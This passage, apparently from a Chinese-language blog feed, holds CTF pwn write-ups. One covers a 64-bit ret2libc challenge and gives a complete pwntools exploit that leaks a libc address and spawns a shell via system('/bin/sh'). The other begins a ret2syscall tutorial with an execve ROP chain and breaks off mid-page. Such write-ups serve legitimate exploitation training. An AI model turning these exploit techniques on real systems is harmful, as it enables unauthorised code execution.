class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x401090</span></span><br><span class="line"><span class="string">  Start of program headers:          64 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          11616 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           56 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         12</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         31</span></span><br><span class="line"><span class="string">  Section header string table index: 30</span></span><br></pre></td></tr></table></figure><ol start="4"><li>IDA分析发现没有 <code>system</code> <code>/bin/sh</code> 之类的 这道题其实跟上道题差不多 唯一不同的就是传递参数的过程了所以我们还需要多弄一步就是 <code>pop rdi</code> 也就是从栈上把数据放到 <code>rdi</code> 寄存器里面 如下所示</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(ret2libc_64/ELF/x86_64)&gt; search pop rdi</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdi</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2libc_64</span><br><span class="line">0x0000000000401293: pop rdi; ret; </span><br></pre></td></tr></table></figure><ol start="5"><li>然后我们数据就都拿到了 exp如下所示</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  <span class="comment"># 开启调试信息</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x401229\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x401293</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload 泄露 read@got</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * offset</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Pls Input&quot;</span>)  <span class="comment"># 第一次提示</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只收一行输出（puts 打印 puts 的地址）</span></span><br><span class="line">leak = p.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak raw:&quot;</span>, leak.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果太短，再试一下用 recv(n)</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(leak) &lt; <span class="number">6</span>:</span><br><span class="line">    leak = p.recvn(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr: &quot;</span>, <span class="built_in">hex</span>(puts_real_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 leak 计算 libc 基址</span></span><br><span class="line">libc_base = puts_real_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bs_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr:&quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bs_addr:&quot;</span>,<span class="built_in">hex</span>(bs_addr))</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">b&#x27;a&#x27;</span> * offset</span><br><span class="line"></span><br><span class="line">payload2 += p64(<span class="number">0x40101a</span>) <span class="comment">#需要添加一个ret，仅仅用于栈平衡</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(bs_addr)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line">payload2 += p64(main_addr)  <span class="comment"># system 返回后跳转 main 避免崩溃</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Pls Input&quot;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li>exp详解</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">1.我们现在知道 libc的版本所以直接用 <span class="string">&#x27;ELF()&#x27;</span> 的形式去加载他 后续我们需要获取<span class="string">&#x27;system&#x27;</span>的偏移以及<span class="string">&#x27;/bin/sh&#x27;</span>的偏移</span><br><span class="line">2.获取完程序本身的 <span class="string">&#x27;puts&#x27;</span> 函数的 <span class="string">&#x27;plt&#x27;</span> 表和 <span class="string">&#x27;got&#x27;</span>表 我们可以通过调用 <span class="string">&#x27;puts&#x27;</span> 函数的特性去把 <span class="string">&#x27;got&#x27;</span> 表的地址给他泄露出来 方便后续计算偏移 再加上linux的特性延迟导入 我们也必须先执行一遍 <span class="string">&#x27;puts&#x27;</span> 才会有 <span class="string">&#x27;got&#x27;</span> 表的初始化</span><br><span class="line">3.之后我们通过获取 <span class="string">&#x27;libc&#x27;</span> 里面的 <span class="string">&#x27;puts&#x27;</span> 函数 我们可以通过 <span class="string">&#x27;puts&#x27;</span> 在程序中的 <span class="string">&#x27;got&#x27;</span> 表的值去计算出 <span class="string">&#x27;libc&#x27;</span> 的基地址 毕竟全是依赖于这个库的</span><br><span class="line">4.既然拿到了基地址 那么 只需要获取 <span class="string">&#x27;system&#x27;</span> 的偏移不就可以计算出真正的 <span class="string">&#x27;system&#x27;</span> 函数的地址了 </span><br><span class="line">5.<span class="string">&#x27;bin/sh&#x27;</span>的获取方法也是同理</span><br><span class="line">6.接着构建栈帧发送<span class="string">&#x27;payload&#x27;</span>即可 因为我们上次<span class="string">&#x27;puts&#x27;</span>的返回地址是程序的入口 相当于又执行了一遍这个程序</span><br><span class="line">7.但是我们在构造<span class="string">&#x27;payload&#x27;</span>的时候 就不能跟32位程序一样了 必须得是用寄存器传递参数</span><br><span class="line">8.最后为什么加了一个<span class="string">&#x27;ret&#x27;</span>来保持堆栈平衡呢?</span><br><span class="line">(1).x86_64 的函数调用规范要求调用前 rsp 必须是 16 字节对齐的。</span><br><span class="line">(2).ret2libc 这类利用中，常常发现直接调用 system 会崩溃，因为栈没对齐导致调用约定不满足。</span><br><span class="line">(3).所以常见套路是用一个短 gadget 做对齐</span><br><span class="line">9.以下是用 gdb 调试来看<span class="string">&#x27;rsp&#x27;</span>是否16位对齐</span><br><span class="line"> 0x40128e &lt;__libc_csu_init+005e&gt; pop    r13</span><br><span class="line">     0x401290 &lt;__libc_csu_init+0060&gt; pop    r14</span><br><span class="line">     0x401292 &lt;__libc_csu_init+0062&gt; pop    r15</span><br><span class="line"> →   0x401294 &lt;__libc_csu_init+0064&gt; ret    </span><br><span class="line">   ↳  0x766564e58750 &lt;system+0000&gt;    endbr64 </span><br><span class="line">      0x766564e58754 &lt;system+0004&gt;    <span class="built_in">test</span>   rdi, rdi</span><br><span class="line">      0x766564e58757 &lt;system+0007&gt;    je     0x766564e58760 &lt;__libc_system+16&gt;</span><br><span class="line">      0x766564e58759 &lt;system+0009&gt;    jmp    0x766564e582d0 &lt;do_system&gt;</span><br><span class="line">      0x766564e5875e &lt;system+000e&gt;    xchg   ax, ax</span><br><span class="line">      0x766564e58760 &lt;system+0010&gt;    sub    rsp, 0x8</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: <span class="string">&quot;ret2libc_64&quot;</span>, stopped 0x401294 <span class="keyword">in</span> __libc_csu_init (), reason: SINGLE STEP</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x401294 → __libc_csu_init()</span><br><span class="line">[#1] 0x766564e58750 →  &lt;system+0&gt; endbr64 </span><br><span class="line">[#2] 0x401176 → frame_dummy()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  i r rsp</span><br><span class="line">rsp            0x7ffcef704be0      0x7ffcef704be0</span><br><span class="line">gef➤  </span><br><span class="line"></span><br><span class="line">10.判断是否16字节对齐，就是看这个值能不能被16整除，也就是看低4位（十六进制）是否为0：</span><br><span class="line">(1).16的十六进制是0x10</span><br><span class="line">(2).计算：0x7fff8b2f8b98 % 0x10</span><br><span class="line">(3).看低位：0xb98，取最低一位16进制数字，就是 8。</span><br><span class="line">(4).0x8 ≠ 0x0，说明 不是16字节对齐。</span><br></pre></td></tr></table></figure><h1 id="总结与思考"><a href="#总结与思考" class="headerlink" title="总结与思考"></a>总结与思考</h1><p>解决ret2libc这样的题目，关键就是把握两个payload的构建方法，理解如下关键公式的含义即可：</p><p><strong><code>函数的真实地址 = 基地址 + 偏移地址 </code></strong></p><p> 最后再次总结一下解题思路：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。</span><br><span class="line"></span><br><span class="line">2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略，实际题目要用到LibcSearch库）。</span><br><span class="line"></span><br><span class="line">3.根据libc库的版本可以很容易的确定puts函数的偏移地址。</span><br><span class="line"></span><br><span class="line">4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。</span><br><span class="line"></span><br><span class="line">5.根据libc函数的版本，确定system函数和<span class="string">&quot;/bin/sh&quot;</span>字符串在libc库中的偏移地址。 </span><br><span class="line"></span><br><span class="line">6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和<span class="string">&quot;/bin/sh&quot;</span>字符串的真实地址。</span><br><span class="line"></span><br><span class="line">7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(<span class="string">&quot;/bin/sh&quot;</span>)的真实地址，从而拿到shell。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pwn-ret2libc&quot;&gt;&lt;a href=&quot;#pwn-ret2libc&quot; class=&quot;headerlink&quot; title=&quot;pwn-ret2libc&quot;&gt;&lt;/a&gt;pwn-ret2libc&lt;/h1&gt;&lt;blockquote&gt;
&lt;h2 id=&quot;题目简介&quot;&gt;&lt;a href=&quot;#题目简介&quot; class=&quot;headerlink&quot; title=&quot;题目简介&quot;&gt;&lt;/a&gt;题目简介&lt;/h2&gt;&lt;p&gt;本文所针对的题目是ret2libc类的基本栈溢出问题。总结而言，要想实现ret2libc，有以下几个必要条件：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.程序本身也没有像system(“&amp;#x2F;bin&amp;#x2F;sh”)这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.程序中可能既没有system函数，又没有”&amp;#x2F;bin&amp;#x2F;sh”字符串，需要我们在libc库中寻找。&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn-ret2syscall</title>
    <link href="http://example.com/2025/06/06/pwn-ret2syscall/"/>
    <id>http://example.com/2025/06/06/pwn-ret2syscall/</id>
    <published>2025-06-06T07:29:21.000Z</published>
    <updated>2025-06-09T10:26:17.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn-ret2syscall"><a href="#pwn-ret2syscall" class="headerlink" title="pwn-ret2syscall"></a>pwn-ret2syscall</h1><h2 id="syscall简介"><a href="#syscall简介" class="headerlink" title="syscall简介"></a>syscall简介</h2><p><code>syscall</code> 就是连接用户态和内核态的桥梁 Linux系统中 <code>用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作</code> 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write)</p><p><code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code></p><p><code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code></p><span id="more"></span><blockquote><h2 id="文本过滤"><a href="#文本过滤" class="headerlink" title="文本过滤"></a>文本过滤</h2><h3 id="✅-一、查找包含特定内容的行"><a href="#✅-一、查找包含特定内容的行" class="headerlink" title="✅ 一、查找包含特定内容的行"></a>✅ 一、查找包含特定内容的行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | grep &quot;关键词&quot;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log.txt | grep &quot;error&quot;</span><br></pre></td></tr></table></figure><blockquote><p>查找 log.txt 中包含 “error” 的所有行。</p></blockquote><hr><h3 id="✅-二、查找不包含关键词的行"><a href="#✅-二、查找不包含关键词的行" class="headerlink" title="✅ 二、查找不包含关键词的行"></a>✅ 二、查找不包含关键词的行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | grep -v &quot;关键词&quot;</span><br></pre></td></tr></table></figure><hr><h3 id="✅-三、忽略大小写查找"><a href="#✅-三、忽略大小写查找" class="headerlink" title="✅ 三、忽略大小写查找"></a>✅ 三、忽略大小写查找</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | grep -i &quot;关键词&quot;</span><br></pre></td></tr></table></figure><hr><h3 id="✅-四、查找多关键词（正则或多个grep）"><a href="#✅-四、查找多关键词（正则或多个grep）" class="headerlink" title="✅ 四、查找多关键词（正则或多个grep）"></a>✅ 四、查找多关键词（正则或多个grep）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | grep -E &quot;error|warning&quot;</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | grep &quot;error&quot; | grep &quot;timeout&quot;</span><br></pre></td></tr></table></figure><hr><h3 id="✅-五、仅输出匹配内容（不含整行）"><a href="#✅-五、仅输出匹配内容（不含整行）" class="headerlink" title="✅ 五、仅输出匹配内容（不含整行）"></a>✅ 五、仅输出匹配内容（不含整行）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | grep -o &quot;关键词&quot;</span><br></pre></td></tr></table></figure><hr><h3 id="✅-六、查找上下文内容（上下几行）"><a href="#✅-六、查找上下文内容（上下几行）" class="headerlink" title="✅ 六、查找上下文内容（上下几行）"></a>✅ 六、查找上下文内容（上下几行）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | grep -A 2 -B 2 &quot;关键词&quot;</span><br></pre></td></tr></table></figure><ul><li><code>-A 2</code>：后2行</li><li><code>-B 2</code>：前2行</li><li><code>-C 2</code>：前后各2行</li></ul><hr><h3 id="✅-七、配合-awk-精准控制输出字段"><a href="#✅-七、配合-awk-精准控制输出字段" class="headerlink" title="✅ 七、配合 awk 精准控制输出字段"></a>✅ 七、配合 <code>awk</code> 精准控制输出字段</h3><p>例如查找包含关键词并输出第2列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | awk &#x27;/关键词/ &#123;print $2&#125;&#x27;</span><br></pre></td></tr></table></figure></blockquote><p><a href="https://syscalls64.paolostivanin.com/">Linux Syscall64 Reference</a></p><p>其中32位系统调用由 <code>int 0x80</code> 触发</p><p>其中64位系统调用由 <code>syscall</code> 触发</p><p>(表格在最后)</p><h2 id="系统调用的传参过程"><a href="#系统调用的传参过程" class="headerlink" title="系统调用的传参过程"></a>系统调用的传参过程</h2><p>系统调用与普通的函数调用不同 他的所有参数都是通过寄存器传递的(前几个参数) 这一点在32位上尤其需要区分</p><p>例如</p><p><img src="/2025/06/06/pwn-ret2syscall/image-20250606154933187.png" alt="image-20250606154933187"></p><p>execve 函数实际调用的就是sys_execve </p><p>是一个系统调用</p><p>32位下他的寄存器传参情况如上</p><p>将寄存器调整为</p><p><code>eax:0xb ebx:/bin/sh ecx:0 edx:0</code></p><p>之后调用 int 0x80 即可</p><p>可以使用 <code>man 命令</code> 进行查看参数</p><p>在32位系统调用中 传入参数的顺序是</p><p><code>ebx,ecx,edx,esi,edi</code></p><p>其中eax存放系统调用号</p><p>在64位系统调用中 传入参数的顺序是</p><p><code>rdi,rsi,rdx,r10,r8,r9</code></p><p>其中rax存放系统调用号</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><code>ret2syscall</code></p><p>先查保护</p><p>另外说一嘴 </p><p><code>file ret2syscall ret2syscall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=bf4950f72d65ea308335af9bb7d8b77dff2bda41, not stripped</code></p><p>用file可以查出该软件是否是静态编译 <code>statically </code> 即使静态编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) cccccchow@Chow:~/pwn/AAA/山化课程/day03-ret2syscall$ checksec ret2syscall</span><br><span class="line">[*] <span class="string">&#x27;/home/cccccchow/pwn/AAA/山化课程/day03-ret2syscall/ret2syscall&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>发现开启了NX保护 也就是说栈不可执行 然后再IDA里面也没有看到 <code>system</code> 以及 <code>execve</code> 等函数</p><p>先说下exp的写法和原理</p><p>假设：</p><ul><li><code>pop_rax = p64(0x4bc808)</code> 是一个地址，里面的代码是 <code>pop rax; ret;</code></li><li><code>pop_rdi = p64(0x401626)</code> 是 <code>pop rdi; ret;</code></li><li><code>pop_rsi = p64(0x401747)</code> 是 <code>pop rsi; ret;</code></li><li><code>pop_rdx = p64(0x442b66)</code> 是 <code>pop rdx; ret;</code></li><li><code>syscall = p64(0x467685)</code> 是 <code>syscall; ret;</code></li><li><code>bs = p64(0x004a1384)</code> 是字符串 “&#x2F;bin&#x2F;sh” 在内存中的地址</li></ul><hr><h2 id="exp执行过程详解"><a href="#exp执行过程详解" class="headerlink" title="exp执行过程详解"></a>exp执行过程详解</h2><ol><li>执行 <code>pop rax; ret</code>：</li></ol><ul><li>CPU跳到 <code>pop_rax</code> 地址</li><li>执行 <code>pop rax</code>，把栈顶的下一个8字节（<code>0x3b</code>）弹出放入 <code>rax</code> 寄存器</li><li>接着执行 <code>ret</code>，跳转到栈上接下来的地址，也就是 <code>pop_rdi</code> 的地址</li></ul><hr><ol start="2"><li>执行 <code>pop rdi; ret</code>：</li></ol><ul><li>弹出栈顶8字节，放到 <code>rdi</code> 寄存器（这个值是 <code>bs</code>，”&#x2F;bin&#x2F;sh” 字符串地址）</li><li><code>ret</code> 跳转到下一个 <code>pop_rsi</code> 的地址</li></ul><hr><ol start="3"><li>执行 <code>pop rsi; ret</code>：</li></ol><ul><li>弹出0，放入 <code>rsi</code></li><li><code>ret</code> 跳转到 <code>pop_rdx</code></li></ul><hr><ol start="4"><li>执行 <code>pop rdx; ret</code>：</li></ol><ul><li>弹出0，放入 <code>rdx</code></li><li><code>ret</code> 跳转到 <code>syscall</code></li></ul><hr><ol start="5"><li>执行 <code>syscall; ret</code>：</li></ol><ul><li>发起系统调用 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，系统内核会帮你执行 <code>/bin/sh</code> shell</li><li>如果成功，shell就被打开了！</li></ul><hr><p>栈内的数据顺序示意图（8字节为单位）</p><p>假设溢出后栈顶（rsp）指向：</p><table><thead><tr><th>栈地址（从上到下，rsp向下增长）</th><th>内容</th><th>说明</th></tr></thead><tbody><tr><td>rsp + 0</td><td>pop_rax</td><td>跳转到这个地址执行 pop rax</td></tr><tr><td>rsp + 8</td><td>0x3b</td><td>pop rax后，rax&#x3D;0x3b</td></tr><tr><td>rsp + 16</td><td>pop_rdi</td><td>pop rdi; ret的地址</td></tr><tr><td>rsp + 24</td><td>bs (“&#x2F;bin&#x2F;sh”地址)</td><td>pop rdi后，rdi&#x3D;bs</td></tr><tr><td>rsp + 32</td><td>pop_rsi</td><td>pop rsi; ret的地址</td></tr><tr><td>rsp + 40</td><td>0</td><td>pop rsi后，rsi&#x3D;0</td></tr><tr><td>rsp + 48</td><td>pop_rdx</td><td>pop rdx; ret的地址</td></tr><tr><td>rsp + 56</td><td>0</td><td>pop rdx后，rdx&#x3D;0</td></tr><tr><td>rsp + 64</td><td>syscall</td><td>syscall; ret的地址</td></tr></tbody></table><p>每执行完一个 <code>pop</code> gadget，<code>rsp</code> 上移16字节（8字节pop值 + 8字节ret地址），执行下一条<code>ret</code>跳转下一个gadget。</p><p>栈顶 (rsp 指向这里，向下地址递增)</p><p>+——————+ &lt;— rsp (程序开始执行ROP链时)<br>|   pop_rax        |  # 地址，执行 pop rax; ret;<br>+——————+<br>|     0x3b         |  # 被 pop 到 rax<br>+——————+<br>|   pop_rdi        |  # 地址，执行 pop rdi; ret;<br>+——————+<br>|      bs          |  # “&#x2F;bin&#x2F;sh” 地址，被 pop 到 rdi<br>+——————+<br>|   pop_rsi        |  # 地址，执行 pop rsi; ret;<br>+——————+<br>|       0          |  # 被 pop 到 rsi<br>+——————+<br>|   pop_rdx        |  # 地址，执行 pop rdx; ret;<br>+——————+<br>|       0          |  # 被 pop 到 rdx<br>+——————+<br>|   syscall        |  # 地址，执行 syscall; ret;<br>+——————+<br>|   …            |  # 后面可能还有其他内容</p><p>假设当前栈顶指针是 <code>rsp</code>，执行 <code>pop reg</code> 后，做了以下三件事：</p><ol><li><strong>从栈顶把数据取出来放到寄存器 <code>reg</code></strong><br>也就是说，把 <code>[rsp]</code> 地址上的内容读出来，赋值给 <code>reg</code>。<br>举例：<code>pop rax</code> 就是把 <code>[rsp]</code> 里的8字节读进 <code>rax</code>。</li><li><strong>移动栈指针 <code>rsp</code> 向上（加8字节，64位系统）</strong><br>把栈顶指针 <code>rsp</code> 增加8（64位下，每个栈项是8字节），这样栈顶就往栈高地址方向移动，指向下一个栈元素。</li><li><strong>执行下一条指令（通常是 <code>ret</code>）</strong><br>在ROP链中，<code>pop</code> 一般配合 <code>ret</code> 使用，<code>ret</code> 从栈顶取出地址跳转。</li></ol><p>所以我们就要去构造系统调用了 先搜索一遍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 